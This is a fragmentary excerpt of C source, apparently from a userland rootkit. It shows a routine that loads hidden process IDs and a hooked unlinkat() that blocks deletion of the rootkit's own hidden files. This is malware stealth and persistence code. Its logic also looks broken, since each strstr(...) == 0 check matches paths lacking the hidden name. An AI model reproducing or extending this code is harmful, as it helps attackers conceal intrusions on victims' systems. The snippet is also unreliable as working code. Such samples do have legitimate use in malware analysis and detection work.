...
void load_hidden_pids() {
    ...
    char buffer[256];
    int index = 14; // Start after the predefined PIDs
...
int unlinkat(int dirfd, const char *pathname, int flags) {
    ...
    if (strcmp(pathname, PATHMRHYDE) == 0 ||
        strstr(pathname, HIDDEN_FILE) == 0 ||
        strstr(pathname, HIDDEN_FILE1) == 0 ||
        strstr(pathname, HIDDEN_FILE2) == 0 ||
        strstr(pathname, HIDDEN_FILE3) == 0 ||
        strstr(pathname, HIDDEN_FILE4) == 0 ||
        strstr(pathname, HIDDEN_FILE5) == 0 ||
        strstr(pathname, HIDDEN_FILE6) == 0 ||
        strstr(pathname, HIDDEN_FILE7) == 0 ||
        strstr(pathname, HIDDEN_FILE8) == 0 ||
        strstr(pathname, HIDDEN_FILE9) == 0) {
        return -1;
    }
